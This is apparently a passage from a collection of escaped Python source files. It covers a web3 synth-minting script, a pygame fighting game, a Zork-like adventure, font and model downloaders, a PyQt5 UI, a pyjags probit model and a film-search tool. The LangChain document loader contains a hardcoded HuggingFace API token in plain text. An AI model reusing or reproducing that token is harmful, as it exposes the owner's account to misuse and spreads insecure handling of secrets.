else:\r\n                # \u5982\u679c\u662f\u5176\u4ed6ValueError\uff0c\u5219\u629b\u51fa\u5f02\u5e38\r\n                raise e\r\n\r\ndef issue_synths(web3, contract_address, from_address, collateral_key, collateral_amount, synth_to_mint, bridge_name, dest_chain_id, erc20_payment, private_key):\r\n    \"\"\"Issue Synths using the issueSynths function.\"\"\"\r\n    contract_address = web3.to_checksum_address(contract_address)\r\n    from_address = web3.to_checksum_address(from_address)\r\n\r\n    contract = web3.eth.contract(address=contract_address, abi=erc20_abi())\r\n\r\n    chain_id = web3.eth.chain_id\r\n    nonce = web3.eth.get_transaction_count(from_address)\r\n    suggested_gas_price = web3.to_wei('5', 'gwei')\r\n    estimated_gas = contract.functions.issueSynths(\r\n        collateral_key,\r\n        collateral_amount,\r\n        synth_to_mint,\r\n        bridge_name,\r\n        dest_chain_id,\r\n        erc20_payment\r\n    ).estimate_gas({\r\n        'from': from_address\r\n    })\r\n\r\n    print(f'from address: {from_address}')\r\n\r\n    for i in range(10):\r\n        print(f'now nonce is {nonce}, send on chain {chain_id} with gas price {suggested_gas_price}, gas {estimated_gas}')\r\n        tx = {\r\n            'nonce': nonce,\r\n            'to': contract_address,\r\n            'value': 0,\r\n            'gas': estimated_gas,\r\n           ",
    "import pygame\nfrom pygame import mixer\nfrom fighter import Fighter\n\nmixer.init()\npygame.init()\n\n#create game window\nSCREEN_WIDTH = 1000\nSCREEN_HEIGHT = 600\n\nscreen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))\npygame.display.set_caption(\"Fighting Game\")\n\n#set framerate\nclock = pygame.time.Clock()\nFPS = 60\n\n#define colours\nRED = (255, 0, 0)\nYELLOW = (255, 255, 0)\nWHITE = (255, 255, 255)\n\n#define game variables\nintro_count = 3\nlast_count_update = pygame.time.get_ticks()\nscore = [0, 0]#player scores. [P1, P2]\nround_over = False\nROUND_OVER_COOLDOWN = 2000\n\n#define fighter variables\nWARRIOR_SIZE = 162\nWARRIOR_SCALE = 4\nWARRIOR_OFFSET = [72, 56]\nWARRIOR_DATA = [WARRIOR_SIZE, WARRIOR_SCALE, WARRIOR_OFFSET]\nWIZARD_SIZE = 250\nWIZARD_SCALE = 3\nWIZARD_OFFSET = [112, 107]\nWIZARD_DATA = [WIZARD_SIZE, WIZARD_SCALE, WIZARD_OFFSET]\n\n#load music and sounds\npygame.mixer.music.load(\"assets/audio/music.mp3\")\npygame.mixer.music.set_volume(0.5)\npygame.mixer.music.play(-1, 0.0, 5000)\nsword_fx = pygame.mixer.Sound(\"assets/audio/sword.wav\")\nsword_fx.set_volume(0.5)\nmagic_fx = pygame.mixer.Sound(\"assets/audio/magic.wav\")\nmagic_fx.set_volume(0.75)\n\n#load background image\nbg_image = pygame.image.load(\"assets/images/background/bck6.jpg\").convert_alpha()\n\n#load spritesheets\nwarrior_sheet = pygame.image.load(\"assets/images/warrior/Sprites/warrior.png\").convert_alpha()\nwizard_sheet = pygame.image.load(\"assets/images/wizard/Sprites/wizard.png\").convert_alpha()\n\n#load vicory image\nvictory_img = pygame.image.load(\"assets/images/icons/victory.png\").convert_alpha()\n\n#define number of steps in each animation\nWARRIOR_ANIMATION_STEPS = [10, 8, 1, 7, 7, 3, 7]\nWIZARD_ANIMATION_STEPS = [8, 8, 1, 8, 8, 3, 7]\n\n#define font\ncount_font = pygame.font.Font(\"assets/fonts/turok.ttf\", 80)\nscore_font = pygame.font.Font(\"assets/fonts/turok.ttf\", 30)\n\n#function for drawing text\ndef draw_text(text, font, text_col, x, y):\n  img = font.render(text, True, text_col)\n  screen.blit(img, (x, y))\n\n#function for drawing background\ndef draw_bg():\n  scaled_bg = pygame.transform.scale(bg_image, (SCREEN_WIDTH, SCREEN_HEIGHT))\n  screen.blit(scaled_bg, (0, 0))\n\n#function for drawing fighter health bars\ndef draw_health_bar(health, x, y):\n  ratio = health / 100\n  pygame.draw.rect(screen, WHITE, (x - 2, y - 2, 404, 34))\n  pygame.draw.rect(screen, RED, (x, y, 400, 30))\n  pygame.draw.rect(screen, YELLOW, (x, y, 400 * ratio, 30))\n\n\n#create two instances of fighters\nfighter_1 = Fighter(1, 200, 310, False, WARRIOR_DATA, warrior_sheet, WARRIOR_ANIMATION_STEPS, sword_fx)\nfighter_2 = Fighter(2, 700, 310, True, WIZARD_DATA, wizard_sheet, WIZARD_ANIMATION_STEPS, magic_fx)\n\n#game loop\nrun = True\nwhile run:\n\n  clock.tick(FPS)\n\n  #draw background\n  draw_bg()\n\n  #show player stats\n  draw_health_bar(fighter_1.health, 20, 20)\n  draw_health_bar(fighter_2.health, 580, 20)\n  draw_text(\"P1: \" + str(score[0]), score_font, RED, 20, 60)\n  draw_text(\"P2: \" + str(score[1]), score_font, RED, 580, 60)\n\n  #update countdown\n  if intro_count <= 0:\n    #move fighters\n    fighter_1.move(SCREEN_WIDTH, SCREEN_HEIGHT, screen, fighter_2, round_over)\n    fighter_2.move(SCREEN_WIDTH, SCREEN_HEIGHT, screen, fighter_1, round_over)\n  else:\n    #display count timer\n    draw_text(str(intro_count), count_font, RED, SCREEN_WIDTH / 2, SCREEN_HEIGHT / 3)\n    #update count timer\n    if (pygame.time.get_ticks() - last_count_update) >= 1000:\n      intro_count -= 1\n      last_count_update = pygame.time.get_ticks()\n\n  #update fighters\n  fighter_1.update()\n  fighter_2.update()\n\n  #draw fighters\n  fighter_1.draw(screen)\n  fighter_2.draw(screen)\n\n  #check for player defeat\n  if round_over == False:\n    if fighter_1.alive == False:\n      score[1] += 1\n      round_over = True\n      round_over_time = pygame.time.get_ticks()\n    elif fighter_2.alive == False:\n      score[0] += 1\n      round_over = True\n      round_over_time = pygame.time.get_ticks()\n  else:\n    #display victory image\n    screen.blit(victory_img, (360, 150))\n    if pygame.time.get_ticks() - round_over_time > ROUND_OVER_COOLDOWN:\n      round_over = False\n      intro_count = 3\n      fighter_1 = Fighter(1, 200, 310, False, WARRIOR_DATA, warrior_sheet, WARRIOR_ANIMATION_STEPS, sword_fx)\n      fighter_2 = Fighter(2, 700, 310, True, WIZARD_DATA, wizard_sheet, WIZARD_ANIMATION_STEPS, magic_fx)\n\n  #event handler\n  for event in pygame.event.get():\n    if event.type == pygame.QUIT:\n      run = False\n\n\n  #update display\n  pygame.display.update()\n\n#exit pygame\npygame.quit()",
    "from zorkMisc import items as it\r\nfrom zorkMisc import monsters as mon\r\nfrom zorkMSG import *\r\nimport traceback\r\n\r\ndirections = {\r\n\t\"north_cmd\": [\"go north\", \"north\", \"n\"],\r\n\t\"east_cmd\": [\"go east\", \"east\", \"e\"],\r\n\t\"south_cmd\": [\"go south\", \"south\", \"s\"],\r\n\t\"west_cmd\": [\"go west\", \"west\", \"w\"],\r\n\t\"northeast_cmd\": [\"go northeast\", \"northeast\", \"ne\"],\r\n\t\"northwest_cmd\": [\"go northwest\", \"northwest\", \"nw\"],\r\n\t\"southeast_cmd\": [\"go southeast\", \"southeast\", \"se\"],\r\n\t\"southwest_cmd\": [\"go southwest\", \"southwest\", \"sw\"],\r\n\t\"down_cmd\": [\"go down\", \"down\", \"d\"],\r\n\t\"up_cmd\": [\"go up\", \"up\", \"u\"],\r\n}\r\n\r\ngrab_cmd = [\"grab\", \"take\"]\r\naction_cmd = [\"read\", \"examine\", \"activate\"]\r\n\r\n\r\nclass Player:\r\n\tdef __init__(self):\r\n\t\tself.inventory = []\r\n\t\tself.position = \"\"\r\n\t\tself.wounds = 0\r\n\t\tself.heals = 0\r\n\r\n\tdef open_inventory(self):\r\n\t\tif len(self.inventory) == 0:\r\n\t\t\tprint(\"You have nothing.\\n\")\r\n\t\telse:\r\n\t\t\tprint(\"Your inventory: \")\r\n\t\t\tfor i in self.inventory:\r\n\t\t\t\tprint(\"A\", i.__class__.__name__)\r\n\r\n\tdef diagnostics(self):\r\n\t\tif self.wounds == 0:\r\n\t\t\tprint(\"You are in perfect health.\")\r\n\t\t\tprint(\"You can be killed by a serious wound.\\n\")\r\n\t\telif self.wounds == 1:\r\n\t\t\tprint(f\"You have a light wound, which can be cured after {self.heals} moves.\")\r\n\t\t\tprint(\"You can be killed by one more light wound.\\n\")\r\n\r\n\tdef grab(self, cmd, obj):\r\n\t\tif hasattr(self.position, \"opened\"):\r\n\t\t\tif (obj in self.position.items) and (self.position.opened) and (cmd in grab_cmd):\r\n\t\t\t\tprint(\"Taken.\\n\")\r\n\t\t\t\tobj.grabbed = True\r\n\t\t\t\tself.inventory.append(obj)\r\n\t\t\t\tself.position.items.remove(obj)\r\n\t\t\telif (obj in self.position.dropped_items):\r\n\t\t\t\tprint(\"Taken.\\n\")\r\n\t\t\t\tobj.grabbed = True\r\n\t\t\t\tself.inventory.append(obj)\r\n\t\t\t\tself.position.dropped_items.remove(obj)\r\n\t\t\telse:\r\n\t\t\t\tprint(f\"You can't see any {obj.__class__.__name__} here!\\n\")\r\n\t\telse:\r\n\t\t\tif (obj in self.position.items) and (cmd in grab_cmd):\r\n\t\t\t\tprint(\"Taken.\\n\")\r\n\t\t\t\tobj.grabbed = True\r\n\t\t\t\tself.inventory.append(obj)\r\n\t\t\t\tself.position.items.remove(obj)\r\n\t\t\telif (obj in self.position.dropped_items):\r\n\t\t\t\tprint(\"Taken.\\n\")\r\n\t\t\t\tobj.grabbed = True\r\n\t\t\t\tself.inventory.append(obj)\r\n\t\t\t\tself.position.dropped_items.remove(obj)\r\n\t\t\telse:\r\n\t\t\t\tprint(f\"You can't see any {obj.__class__.__name__} here!\\n\")\r\n\r\n\tdef drop(self, obj):\r\n\t\tif (obj in self.inventory):\r\n\t\t\tself.position.dropped_items.append(obj)\r\n\t\t\tobj.grabbed = False\r\n\t\t\tself.inventory.remove(obj)\r\n\t\t\tprint(\"Dropped.\\n\")\r\n\t\telif (len(self.inventory) > 0) and (obj not in self.inventory):\r\n\t\t\tprint(f\"You don't have a/an {obj.__class__.__name__}.\\n\")\r\n\t\telif len(self.inventory) == 0:\r\n\t\t\tprint(\"You have nothing to drop.\\n\")\r\n\r\n\tdef action(self, obj):\r\n\t\tif len(self.inventory) > 0:\r\n\t\t\tself.inventory.obj.action()\r\n\r\n\tdef death(self):\r\n\t\tfor i in self.inventory:\r\n\t\t\tliving_room.dropped_items.append(i)\r\n\t\t\tself.inventory.remove(i)\r\n\t\tself.position = forest_path\r\n\t\tself.wounds = 0\r\n\t\tself.heals = 0\r\n\t\tprint(death_msg)\r\n\t\tself.position.enter()\r\n\r\n\tdef attack(self, monster, weapon, player):\r\n\t\tif (monster in mon) and (mon[monster].position == self.position):\r\n\t\t\tmon[monster].hurt(player, weapon)\r\n\t\telse:\r\n\t\t\tprint(f\"You don't see any {monster} here!\\n\")\r\n\r\nclass WestHouse:\r\n\tdef __init__(self):\r\n\t\tself.items = [it[\"leaflet\"]]\r\n\t\tself.dropped_items = []\r\n\t\tself.entered = False\r\n\t\tself.opened = False\r\n\t\r\n\tdef enter(self):\r\n\t\tprint(\"West of House\")\r\n\t\tif self.entered == False:\r\n\t\t\tprint(\"\"\"You are standing in an open field west of a white house, with a boarded front door.\r\nThere is a small mailbox here.\\n\"\"\")\r\n\t\telse:\r\n\t\t\tprint(\"There is a small mailbox here.\\n\") \r\n\t\tself.entered = True\r\n\r\n\tdef open(self, obj):\r\n\t\tif (self.opened == False) and (obj == \"mailbox\"):\r\n\t\t\tself.opened = True\r\n\t\t\tprint(\"Opening the small mailbox reveals a leaflet.\\n\")\r\n\t\telif self.opened == True:\r\n\t\t\tprint(\"It is already opened.\\n\")\r\n\r\n\tdef travel(self, direction):\r\n\t\tif direction == \"n\":\r\n\t\t\treturn north_house\r\n\t\telif direction == \"e\":\r\n\t\t\treturn \"The door is boarded and you can't remove the boards.\\n\"\r\n\t\telif direction == \"s\":\r\n\t\t\treturn south_house\r\n\t\telif direction == \"w\":\r\n\t\t\treturn forest\r\n\t\telse:\r\n\t\t\treturn \"Invalid for some reason!\\n\"\r\nwest_house = WestHouse()\r\n\r\nclass NorthHouse:\r\n\tdef __init__(self):\r\n\t\tself.dropped_items = []\r\n\t\tself.entered = False\r\n\r\n\tdef enter(self):\r\n\t\tprint(\"North of House\")\r\n\t\tif self.entered == False:\r\n\t\t\tprint(north_house_msg)\r\n\t\tself.entered = True\r\n\t\tprint(\"\\n\")\r\n\r\n\tdef travel(self, direction):\r\n\t\tif direction == \"n\":\r\n\t\t\treturn forest_path\r\n\t\telif direction == \"e\":\r\n\t\t\treturn behind_house\r\n\t\telif direction == \"s\":\r\n\t\t\treturn \"The windows are all boarded.\\n\"\r\n\t\telif direction == \"w\":\r\n\t\t\treturn west_house\r\n\t\telse:\r\n\t\t\treturn \"Invalid for some reason!\\n\"\r\nnorth_house = NorthHouse()\r\n\r\nclass ForestPath:\r\n\tdef __init__(self):\r\n\t\tself.entered = False\r\n\t\tself.dropped_items = []\r\n\r\n\tdef enter(self):\r\n\t\tprint(\"Forest Path\")\r\n\t\tif self.entered == False:\r\n\t\t\tprint(forest_path_msg)\r\n\t\t\tself.entered = True\r\n\t\tprint(\"\\n\")\r\n\r\n\tdef travel(self, ",
    "import sys\nimport os\nimport wget\n\nfrom pathlib import Path\n\nROOT_PATH = sys.path[0]  # \u9879\u76ee\u6839\u76ee\u5f55\n\nfonts_list = [\"SimSun.ttf\", \"TimesNewRoman.ttf\", \"malgun.ttf\"]  # \u5b57\u4f53\u5217\u8868\nmodels_list = [\"cnn_se.pt\", \"detr_based.pt\", \"vit_based.pt\", \"yolov5_based.pt\", \"yolov8_based.pt\"] # \u6a21\u578b\u5217\u8868\nfonts_directory_path = Path(ROOT_PATH, \"fonts\")  # \u5b57\u4f53\u5b58\u653e\u76ee\u5f55\nmodels_directory_path = Path(ROOT_PATH, \"models\")  # \u6a21\u578b\u5b58\u653e\u76ee\u5f55\n\ndata_url_dict = {\n    \"SimSun.ttf\": \"https://raw.githubusercontent.com/Tsumugii24/Typora-images/main/files/SimSun.ttf\",\n    \"TimesNewRoman.ttf\": \"https://raw.githubusercontent.com/Tsumugii24/Typora-images/main/files/TimesNewRoman.ttf\",\n    \"malgun.ttf\": \"https://raw.githubusercontent.com/Tsumugii24/Typora-images/main/files/malgun.ttf\",\n}\n\nmodel_url_dict = {\n    \"yolov3.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/cnn_se.pt\",\n    \"yolov5.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/detr_based.pt\",\n    \"yolov6.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/vit_based.pt\",\n    \"yolov8.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/yolov5_based.pt\",\n    \"yolov9c.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/yolov8_based.pt\",\n    \"yolov9e.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/yolov8_based.pt\",\n    \"vision-transformers.pt\": \"https://huggingface.co/Tsumugii/lesion-cells-det/resolve/main/yolov8_based.pt\",\n}\n\n# \u5224\u65ad\u5b57\u4f53\u6587\u4ef6\u662f\u5426\u5b58\u5728\ndef is_fonts(fonts_dir):\n    if fonts_dir.is_dir():\n        # \u5982\u679c\u672c\u5730\u5b57\u4f53\u5e93\u5b58\u5728\n        local_font_list = os.listdir(fonts_dir)  # \u672c\u5730\u5b57\u4f53\u5e93\n\n        font_diff = list(set(fonts_list).difference(set(local_font_list)))\n\n        if font_diff != []:\n            # \u7f3a\u5931\u5b57\u4f53\n            download_fonts(font_diff)  # \u4e0b\u8f7d\u7f3a\u5931\u7684\u5b57\u4f53\n        else:\n            print(f\"{fonts_list}[bold green]Required fonts already downloaded\uff01[/bold green]\")\n    else:\n        # \u672c\u5730\u5b57\u4f53\u5e93\u4e0d\u5b58\u5728\uff0c\u521b\u5efa\u5b57\u4f53\u5e93\n        print(\"[bold red]Local fonts library does not exist, creating now...[/bold red]\")\n        download_fonts(fonts_list)  # \u521b\u5efa\u5b57\u4f53\u5e93\n        \n# \u5224\u65ad\u6a21\u578b\u6587\u4ef6\u662f\u5426\u5b58\u5728\ndef is_models(models_dir):\n    if models_dir.is_dir():\n        # \u5982\u679c\u672c\u5730\u6a21\u578b\u5e93\u5b58\u5728\n        local_model_list = os.listdir(models_dir)  # \u672c\u5730\u6a21\u578b\u5e93\n\n        model_diff = list(set(models_list()).difference(set(local_model_list)))\n\n        if model_diff != []:\n            # \u7f3a\u5931\u6a21\u578b\n            download_models(model_diff)  # \u4e0b\u8f7d\u7f3a\u5931\u7684\u6a21\u578b\n        else:\n            print(f\"{models_list}[bold green]Required models already downloaded\uff01[/bold green]\")\n    else:\n        # \u672c\u5730\u6a21\u578b\u5e93\u4e0d\u5b58\u5728\uff0c\u521b\u5efa\u6a21\u578b\u5e93\n        print(\"[bold red]Local models library does not exist, creating now...[/bold red]\")\n        download_models(models_list)  # \u521b\u5efa\u6a21\u578b\u5e93\n\n# \u4e0b\u8f7d\u5b57\u4f53\ndef download_fonts(font_diff):\n    global font_name\n\n    for k, v in data_url_dict.items():\n        if k in font_diff:\n            font_name = v.split(\"/\")[-1]  # \u5b57\u4f53\u540d\u79f0\n            fonts_directory_path.mkdir(parents=True, exist_ok=True)  # \u521b\u5efa\u672c\u5730\u5b57\u4f53\u76ee\u5f55\n\n            font_file_path = f\"{ROOT_PATH}/fonts/{font_name}\"  # \u5b57\u4f53\u8def\u5f84\n            # \u4e0b\u8f7d\u5b57\u4f53\u6587\u4ef6\n            wget.download(v, font_file_path)\n            print(\"Downloading required font files\")\n\n# \u4e0b\u8f7d\u6a21\u578b\ndef download_models(model_diff):\n    global model_name\n\n    for k, v in model_url_dict.items():\n        if k in model_diff:\n            model_name = v.split(\"/\")[-1]  # \u6a21\u578b\u540d\u79f0\n            models_directory_path.mkdir(parents=True, exist_ok=True)  # \u521b\u5efa\u672c\u5730\u6a21\u578b\u76ee\u5f55\n\n            model_file_path = f\"{ROOT_PATH}/models/{model_name}\"  # \u6a21\u578b\u8def\u5f84\n            # \u4e0b\u8f7d\u6a21\u578b\u6587\u4ef6\n            wget.download(v, model_file_path)\n            print(\"Downloading required model weight files\")\n\n\nis_fonts(fonts_directory_path)\nis_models(models_directory_path)",
    "# -*- coding: utf-8 -*-\n\n# Form implementation generated from reading ui file 'albargui.ui'\n#\n# Created by: PyQt5 UI code generator 5.15.9\n#\n# WARNING: Any manual changes made to this file will be lost when pyuic5 is\n# run again.  Do not edit this file unless you know what you are doing.\n\n\nfrom PyQt5 import QtCore, QtGui, QtWidgets\n\n\nclass Ui_albargui(object):\n    def setupUi(self, albargui):\n        albargui.setObjectName(\"albargui\")\n        albargui.resize(836, 595)\n        self.centralwidget = QtWidgets.QWidget(albargui)\n        self.centralwidget.setObjectName(\"centralwidget\")\n        self.label = QtWidgets.QLabel(self.centralwidget)\n        self.label.setGeometry(QtCore.QRect(10, 0, 811, 561))\n        self.label.setText(\"\")\n        self.label.setPixmap(QtGui.QPixmap(\"C:/Users/ADMIN/Downloads/7LP8.gif\"))\n        self.label.setScaledContents(True)\n        self.label.setObjectName(\"label\")\n        self.pushButton = QtWidgets.QPushButton(self.centralwidget)\n        self.pushButton.setGeometry(QtCore.QRect(530, 450, 75, 23))\n        self.pushButton.setStyleSheet(\"\\n\"\n\"background-color: rgb(0, 85, 127);\")\n        self.pushButton.setObjectName(\"pushButton\")\n        self.pushButton_2 = QtWidgets.QPushButton(self.centralwidget)\n        self.pushButton_2.setGeometry(QtCore.QRect(660, 450, 75, 23))\n        self.pushButton_2.setStyleSheet(\"\\n\"\n\"background-color: rgb(0, 85, 127);\")\n        self.pushButton_2.setObjectName(\"pushButton_2\")\n        albargui.setCentralWidget(self.centralwidget)\n        self.menubar = QtWidgets.QMenuBar(albargui)\n        self.menubar.setGeometry(QtCore.QRect(0, 0, 836, 21))\n        self.menubar.setObjectName(\"menubar\")\n        albargui.setMenuBar(self.menubar)\n        self.statusbar = QtWidgets.QStatusBar(albargui)\n        self.statusbar.setObjectName(\"statusbar\")\n        albargui.setStatusBar(self.statusbar)\n\n        self.retranslateUi(albargui)\n        QtCore.QMetaObject.connectSlotsByName(albargui)\n\n    def retranslateUi(self, albargui):\n        _translate = QtCore.QCoreApplication.translate\n        albargui.setWindowTitle(_translate(\"albargui\", \"MainWindow\"))\n        self.pushButton.setText(_translate(\"albargui\", \"RUN\"))\n        self.pushButton_2.setText(_translate(\"albargui\", \"TERMINATE\"))\n\n\nif __name__ == \"__main__\":\n    import sys\n    app = QtWidgets.QApplication(sys.argv)\n    albargui = QtWidgets.QMainWindow()\n    ui = Ui_albargui()\n    ui.setupUi(albargui)\n    albargui.show()\n    sys.exit(app.exec_())\n",
    "import pyjags\nimport numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nfrom scipy.stats import multivariate_normal, norm, mvn\nfrom sklearn.preprocessing import StandardScaler, MinMaxScaler\nfrom sklearn.model_selection import train_test_split\nimport math\nfrom itertools import product\n\nmodel_code_template = model_code_template = \"\"\" \nmodel {{\n  # Declare likelihood for Y, relationship between Y and Y_s\n  for (i in 1:n) {{\n    for (q in 1:{n_outputs}) {{  # Extend loop for the third outcome\n      Y[i, q] ~ dinterval(Z[i, q], 0)\n      mu[i, q] <- X[i,] %*% Beta[, q]\n    }}\n    Z[i, 1:{n_outputs}] ~ dmnorm.vcov(mu[i, ], prec[1:{n_outputs}, 1:{n_outputs}])  # Extend to accommodate the third outcome\n  }}\n\n  # Prior on Betas\n  for (q in 1:{n_outputs}) {{  # Extend loop for the third outcome\n    Beta[1:P, q] ~ dmnorm(b_0, B_0)\n  }}\n\n  # Prior on covariance matrix\n  prec[1:{n_outputs}, 1:{n_outputs}] <- cov[, ]\n  {covariance_block}\n  # Flat priors on all parameters which could, of course, be made more informative.\n  for (i in 1:{n_outputs}) {{\n    sigma[i] = 1  # Extend to accommodate the third outcome\n  }}\n  \n  rho12 ~ dunif(-1, 1)  # Prior for rho12\n  rho13 ~ dunif(-1, 1)  # Prior for rho13\n  rho23 ~ dunif(-1, 1)  # Prior for rho23\n}}\n\"\"\"\n\n\nclass Probit_Model:\n    def __init__(self, X, Y, model_code = model_code_template):\n        self.X = X\n        self.Y = Y\n        self.model_code = model_code\n\n        self.X_train, self.X_test, self.y_train, self.y_test = train_test_split(self.X, self.Y, test_size=0.2)\n\n        self.n_params = self.X.shape[1]\n        self.n_outputs = self.Y.shape[1]\n        self.data = {\n            \"n\": self.X_train.shape[0],\n            \"P\": self.n_params + 1,  # Number of inputs + 1 (for intercept)\n            \"Y\": np.column_stack([self.y_train['Y{}'.format(i)] for i in range(1, self.n_outputs + 1)]),\n            \"X\": np.column_stack([np.ones(self.X_train.shape[0])] + [self.X_train['X{}'.format(i)] for i in range(1, self.n_params + 1)]),\n            \"b_0\": np.zeros(self.n_params + 1),  # Number of inputs + 1 (for intercept)\n            \"B_0\": np.diag(np.repeat(0.1, self.n_params + 1))  # Precision (Number of inputs + 1)\n        }\n        self.rho_params = [f'rho{i}{j}' for i in range(1, self.n_outputs + 1) for j in range(i + 1, self.n_outputs + 1)]\n        \n        covariance_block = \"\"\n        for i in range(1, self.n_params + 1):\n            for j in range(1, self.n_params + 1):\n                if i == j:\n                    covariance_block += f\"  cov[{i}, {j}] <- sigma[{i}] * sigma[{j}]\\n\"\n                else:\n                    covariance_block += f\"  cov[{i}, {j}] <- sigma[{i}] * sigma[{j}] * rho{min(i,j)}{max(i,j)}\\n\"\n        \n        \n        # Fill in the placeholders in the Python code template\n        self.model_code = self.model_code.format(n_outputs=self.n_outputs,\n            covariance_block=covariance_block\n        )\n\n    def initialise_model(self, chains):\n        self.initial_values = {\"Z\": test.y_train[[f'Y{i}' for i in range(1, test.n_outputs + 1)]].values}\n        for i in self.rho_params:\n            self.initial_values[i] = 0\n        # Compile the model\n        self.model = pyjags.Model(code=self.model_code, data=self.data, chains = chains, init=self.initial_values, threads = chains)\n\n    def fit(self, iterations = 10000):\n        self.samples = self.model.sample(vars=['Beta'] + self.rho_params, iterations=iterations)\n\n    def _extract_posterior_means(self, burn_in=5000):\n        # Extract correlation parameters\n        rho_post_means = {f'rho{i}{j}_post_mean': np.mean(self.samples[self.rho_params[(i - 1) * (self.n_outputs - i) + (j - i - 1)]][0][burn_in:]) \n                          for i in range(1, self.n_outputs) for j in range(i + 1, self.n_outputs + 1)}\n    \n        # Extract regression coefficients\n        beta = self.samples['Beta'][:, :, burn_in:, :]\n        beta_post_means = {f'beta{q}_post_mean': np.mean(beta[:, q - 1, :, 0], axis=1) for q in range(1, self.n_outputs + 1)}\n    \n        return {**rho_post_means, **beta_post_means}\n\n    def predict(self):\n        parameters_dic = self._extract_posterior_means()\n",
    "from langchain.document_loaders import DirectoryLoader\nfrom langchain_community.document_loaders import PyPDFLoader\nfrom PyPDF2 import PdfFileReader\nfrom langchain.text_splitter import RecursiveCharacterTextSplitter\nfrom langchain.schema import Document\nfrom langchain_community.embeddings import HuggingFaceInferenceAPIEmbeddings\nfrom langchain.vectorstores.chroma import Chroma\nimport os\nimport shutil\nimport glob\n\nCHROMA_PATH = \"chroma\"\nDATA_PATH = \"data/Image-Manipulation-and-Enhancement-Java-UI-UX\"\ninference_api_key = \"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\"\n\n\ndef main():\n    generate_data_store()\n\n\ndef generate_data_store():\n    documents = load_documents()\n    chunks = split_text(documents)\n    save_to_chroma(chunks)\n\ndef pdf_to_md(pdf_file_path, md_file_path):\n    with open(pdf_file_path, 'rb') as pdf_file:\n        pdf_reader = PdfFileReader(pdf_file)\n        with open(md_file_path, 'w') as md_file:\n            for page_num in range(pdf_reader.numPages):\n                page = pdf_reader.getPage(page_num)\n                md_file.write(page.extractText())\n                md_file.write('\\n\\n')\n\ndef other_to_md(input_file_path, md_file_path):\n    with open(input_file_path, 'r') as input_file:\n        content = input_file.read()\n        with open(md_file_path, 'w') as md_file:\n            md_file.write(content)\n\ndef load_documents():\n    documents = []\n    md_directory = './data/MDfiles/'\n    os.makedirs(md_directory, exist_ok=True)\n    for root, _, files in os.walk(DATA_PATH):\n        for f in files:\n            file_path = os.path.join(root, f)\n            if f.endswith('.pdf'):\n                print(\"Reading PDF - \", f)\n                pdf_to_md(file_path, md_directory+str(f)+'.md')\n            \n            elif f.endswith('.java') or f.endswith('.txt'):\n                print(\"Reading - \", f)\n                other_to_md(file_path, md_directory+str(f)+'.md')\n    \n    loader = DirectoryLoader(md_directory, glob=\"*.md\")\n    documents = loader.load()\n    return documents\n\n\ndef split_text(documents):\n    print('Splitting Text')\n    text_splitter = RecursiveCharacterTextSplitter(\n        chunk_size=300,\n        chunk_overlap=100,\n        length_function=len,\n        add_start_index=True,\n    )\n    # chunks = []\n    # for doc in documents:\n    #     chunked_doc = text_splitter.split_documents(doc)\n    #     chunks.extend(chunked_doc)\n    chunks = text_splitter.split_documents(documents)\n    print(f\"Split {len(documents)} documents into {len(chunks)} chunks.\")\n    return chunks\n\n\ndef save_to_chroma(chunks):\n    # Clear out the database first.\n    if os.path.exists(CHROMA_PATH):\n        shutil.rmtree(CHROMA_PATH)\n    \n    print('Embedding...')\n    embeddings = HuggingFaceInferenceAPIEmbeddings(\n        api_key=inference_api_key, \n        model_name=\"sentence-transformers/all-MiniLM-l6-v2\"\n    )\n    \n    # Create a new DB from the documents.\n    db = Chroma.from_documents(chunks, embeddings, persist_directory=CHROMA_PATH)\n    db.persist()\n    print(f\"Saved {len(chunks)} chunks to {CHROMA_PATH}.\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import csv\nimport json\nimport argparse\n\ncsv_file = open(\"films.csv\", \"r\")\ncsv_list = csv.reader(csv_file)\ndict_reader = csv.DictReader(csv_file)\nfilms_dict = [row for row in dict_reader]\n\nseparator = \"-\" * 40\n\nparser = argparse.ArgumentParser(description=\"2 execution options: search by title -t/--title [title name] or search by genre -g/--genre\")\nparser.add_argument(\"-t\", \"--title\", nargs=\"+\", help = \"search by film title (argument [title name] is required)\")\nparser.add_argument(\"-g\", \"--genre\", help = \"search by film genre (no additional arguments required)\", action=\"store_true\", default=False)\narg = parser.parse_args()\n\n\ndef main():\n\tif arg.title:\n\t\ttitle_search()\n\telif arg.genre:\n\t\tgenre_search()\n\telse:\n\t\tprint(\"Enter -h/--help to see a 'help' message.\")\n\n\n# noinspection PyTypeChecker\ndef title_search():\n\tuser_film = \" \".join(arg.title)\n\tuser_film_search_dict = {f\"{film[\"title\"]} ({film[\"year\"]})\": film for film in films_dict if user_film.strip().casefold() in film[\"title\"].strip().casefold()}\n\n\tif not user_film_search_dict:\n\t\treturn print(separator, \"No films found\", sep=\"\\n\")\n\telif len(user_film_search_dict) == 1:\n\t\tprint(separator, \"Here is info about film:\\n\", sep=\"\\n\")\n\t\tfor film in user_film_search_dict.values():\n\t\t\tfor key_pair in film:\n\t\t\t\tprint(f\"\\t{key_pair}:\\t{film.get(key_pair)}\")\n\telse:\n\t\tmulti_choice(user_film_search_dict)\n\n\ndef multi_choice(user_film_search_dict):\n\tfilm_names = [film[\"title\"] for film in user_film_search_dict.values()]\n\tcounter = 0\n\n\tif len(film_names) != len(set(film_names)):\n\t\tprint(\"\\nLook what we have:\")\n\t\tfor film in user_film_search_dict.values():\n\t\t\tcounter += 1\n\t\t\tfilm.update({\"number\": counter})\n\t\t\tprint(f\"{film[\"number\"]} \\t {film[\"title\"]} ({film[\"year\"]})\")\n\telse:\n\t\tfor film in user_film_search_dict.values():\n\t\t\tcounter += 1\n\t\t\tprint(f\"{counter} \\t {film[\"title\"]}\")\n\t\t\tfilm.update({\"number\": counter})\n\terror_message_title = \"Please choose one film to get detail info. Enter number from 1 to {}: \"\n\tuser_num = user_number(error_message_title, counter)\n\tfor film in user_film_search_dict.values():\n\t\tif film[\"number\"] == 